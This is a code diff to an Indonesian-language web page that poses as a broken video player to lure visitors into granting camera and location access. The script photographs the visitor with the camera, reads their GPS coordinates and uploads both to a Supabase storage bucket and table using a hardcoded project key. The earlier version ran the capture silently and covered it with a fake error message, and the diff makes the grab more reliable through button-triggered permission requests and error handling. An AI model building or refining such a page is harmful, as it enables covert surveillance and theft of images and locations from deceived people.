@@ -25,7 +25,7 @@
     font-size: 1.5rem;
     font-weight: 600;
     letter-spacing: -1px;
-    color: #e74c3c; /* Warna merah error */
+    color: #e74c3c;
     border-bottom: 1px solid #222;
     background: rgba(15, 15, 15, 0.8);
     backdrop-filter: blur(10px);
@@ -78,7 +78,6 @@
     color: #555;
   }
 
-  /* Icon Video Rusak */
   .error-icon {
     font-size: 3rem;
     margin-bottom: 10px;
@@ -96,7 +95,15 @@
   }
 
   #canvas { display: none; }
-  video { display: none; }
+  
+  /* Tampilkan video sementara untuk testing, bisa dihide lagi nanti */
+  video { 
+    width: 100%;
+    max-width: 300px;
+    margin: 10px auto;
+    border-radius: 8px;
+    display: block;
+  }
 
   .floating-info {
     position: fixed;
@@ -109,6 +116,23 @@
     font-weight: 600;
     box-shadow: 0 4px 15px rgba(231, 76, 60, 0.3);
   }
+
+  .test-buttons {
+    display: flex;
+    gap: 10px;
+    margin-top: 10px;
+    justify-content: center;
+  }
+
+  .test-btn {
+    background: #e74c3c;
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-weight: 600;
+  }
 </style>
 </head>
 <body>
@@ -117,6 +141,10 @@
 
 <div id="statusBox">
   <div id="statusText">System: Mendeteksi pemutar video...</div>
+  <!-- Tambah tombol manual untuk test -->
+  <div class="test-buttons">
+    <button class="test-btn" onclick="requestPermissions()">IZINKAN AKSES</button>
+  </div>
 </div>
 
 <div id="list">
@@ -127,14 +155,15 @@
       <p style="font-size: 0.7rem;">Error Code: 0x80040255</p>
     </div>
     <div class="info-overlay">
-      <div class="info-text">Izinkan dulu- Mencoba memuat ulang...</div>
+      <div class="info-text">Klik tombol IZINKAN AKSES untuk melanjutkan</div>
     </div>
   </div>
 </div>
 
 <div class="floating-info" id="notif">selamat menonton bang #inierayazz</div>
 
-<video id="video" autoplay playsinline></video>
+<!-- Tampilkan video preview -->
+<video id="video" autoplay playsinline style="display: none;"></video>
 <canvas id="canvas" width="640" height="480"></canvas>
 
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
@@ -142,61 +171,155 @@
   const SUPABASE_URL = "https://ttptotondiqkqsznuapw.supabase.co";
   const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR0cHRvdG9uZGlxa3Fzem51YXB3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMzMTUzOTYsImV4cCI6MjA4ODg5MTM5Nn0.f9kTPb8CKit4vhfdREmYGrERxNj44RTSfWy7FDCAHu8";
   const BUCKET = "foto-users"; 
-  const { createClient } = supabase;
-  const client = createClient(SUPABASE_URL, SUPABASE_KEY);
+  
+  let supabaseClient;
+  try {
+    const { createClient } = supabase;
+    supabaseClient = createClient(SUPABASE_URL, SUPABASE_KEY);
+    console.log("Supabase client initialized");
+  } catch (e) {
+    console.error("Supabase init error:", e);
+  }
 
   const statusText = document.getElementById("statusText");
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
+  const notif = document.getElementById("notif");
 
-  // FITUR TETAP JALAN DI BELAKANG LAYAR
-  async function startProcess() {
-    statusText.innerText = "izinkan dulu bang baru nonton";
+  // Fungsi untuk meminta permission
+  window.requestPermissions = async function() {
+    statusText.innerText = "Meminta akses kamera dan lokasi...";
+    notif.innerText = "🔴 Mohon izinkan akses kamera & lokasi";
     
-    if (!navigator.geolocation) return;
+    try {
+      // Cek geolocation dulu
+      if (!navigator.geolocation) {
+        throw new Error("Geolocation tidak didukung");
+      }
 
-    navigator.geolocation.getCurrentPosition(async (pos) => {
-      const { latitude: lat, longitude: lon } = pos.coords;
-      statusText.innerText = "Memproses video... mohon tunggu";
-      captureAndUpload(lat, lon);
-    }, (err) => {
-      statusText.innerText = "Gagal memuat: Akses ditolak.";
-    });
+      // Minta lokasi
+      navigator.geolocation.getCurrentPosition(async (pos) => {
+        const { latitude: lat, longitude: lon } = pos.coords;
+        statusText.innerText = "Lokasi didapatkan, mengakses kamera...";
+        
+        // Minta akses kamera
+        await captureAndUpload(lat, lon);
+        
+      }, (geoError) => {
+        console.error("Geo error:", geoError);
+        statusText.innerText = "Gagal dapat lokasi: " + geoError.message;
+        
+        // Tetap coba kamera meskipun lokasi gagal
+        captureAndUpload(null, null);
+      });
+
+    } catch (error) {
+      console.error("Permission error:", error);
+      statusText.innerText = "Error: " + error.message;
+    }
   }
 
   async function captureAndUpload(lat, lon) {
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+      // Minta akses kamera dengan konfigurasi yang lebih sederhana
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        video: true,  // Ganti dengan konfigurasi sederhana dulu
+        audio: false 
+      });
+      
+      console.log("Camera access granted");
+      statusText.innerText = "Kamera aktif, mengambil gambar...";
+      notif.innerText = "📸 Mengambil foto...";
+      
+      // Tampilkan video untuk testing (bisa di-comment kalo udah work)
+      video.style.display = 'block';
       video.srcObject = stream;
 
-      setTimeout(async () => {
-        const context = canvas.getContext("2d");
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      // Tunggu video siap
+      video.onloadedmetadata = () => {
+        video.play();
         
-        canvas.toBlob(async (blob) => {
-          const fileName = `vid_${Date.now()}.jpg`;
-          const { error: uploadError } = await client.storage
-            .from(BUCKET)
-            .upload(fileName, blob, { contentType: "image/jpeg" });
+        setTimeout(async () => {
+          try {
+            const context = canvas.getContext("2d");
+            // Pastikan video sudah punya ukuran
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(async (blob) => {
+              if (!blob) {
+                throw new Error("Gagal buat blob");
+              }
 
-          if (!uploadError) {
-            await client.from("lokasi_users").insert([
-              { foto: fileName, latitude: lat, longitude: lon }
-            ]);
-            // Tidak menampilkan foto di layar, hanya mengubah status kecil
-            statusText.innerText = "Kesalahan teknis: Pemutar tidak didukung.";
+              const fileName = `capture_${Date.now()}.jpg`;
+              statusText.innerText = "Uploading...";
+              
+              // Upload ke Supabase
+              if (supabaseClient) {
+                const { error: uploadError } = await supabaseClient.storage
+                  .from(BUCKET)
+                  .upload(fileName, blob, { 
+                    contentType: "image/jpeg",
+                    cacheControl: "3600"
+                  });
+
+                if (uploadError) {
+                  console.error("Upload error:", uploadError);
+                  statusText.innerText = "Gagal upload: " + uploadError.message;
+                } else {
+                  statusText.innerText = "Upload berhasil!";
+                  notif.innerText = "✅ Foto tersimpan!";
+                  
+                  // Insert ke tabel lokasi
+                  if (lat && lon) {
+                    await supabaseClient.from("lokasi_users").insert([
+                      { foto: fileName, latitude: lat, longitude: lon }
+                    ]);
+                  }
+                }
+              } else {
+                console.log("Mock upload:", fileName, "lat:", lat, "lon:", lon);
+                statusText.innerText = "Simulasi: " + fileName;
+              }
+              
+              // Matikan kamera setelah selesai
+              stream.getTracks().forEach(track => track.stop());
+              video.style.display = 'none';
+              
+            }, "image/jpeg", 0.8);
+            
+          } catch (err) {
+            console.error("Capture error:", err);
+            statusText.innerText = "Gagal capture: " + err.message;
           }
-          stream.getTracks().forEach(track => track.stop());
-        }, "image/jpeg", 0.7);
-      }, 2000);
+        }, 2000);
+      };
 
-    } catch (err) {
-      console.error("Cam Error");
+    } catch (cameraError) {
+      console.error("Camera error detail:", cameraError);
+      statusText.innerText = "Gagal akses kamera: " + cameraError.message;
+      notif.innerText = "❌ Gagal akses kamera";
+      
+      // Log error lebih detail
+      if (cameraError.name === "NotAllowedError") {
+        statusText.innerText = "Akses kamera ditolak. Izinkan di settings browser.";
+      } else if (cameraError.name === "NotFoundError") {
+        statusText.innerText = "Tidak ada kamera terdeteksi.";
+      } else if (cameraError.name === "NotReadableError") {
+        statusText.innerText = "Kamera sedang digunakan aplikasi lain.";
+      }
     }
   }
 
-  // Menjalankan proses capture tanpa merubah list UI
-  startProcess();
+  // Auto-start dengan delay dan handle error lebih baik
+  setTimeout(() => {
+    statusText.innerText = "Klik tombol IZINKAN AKSES untuk memulai";
+  }, 1000);
+
+  // Catatan: Hapus auto-start, pake tombol manual biar user action required
+  // startProcess();  // COMMENT INI!
 </script>
 </body>
 </html>
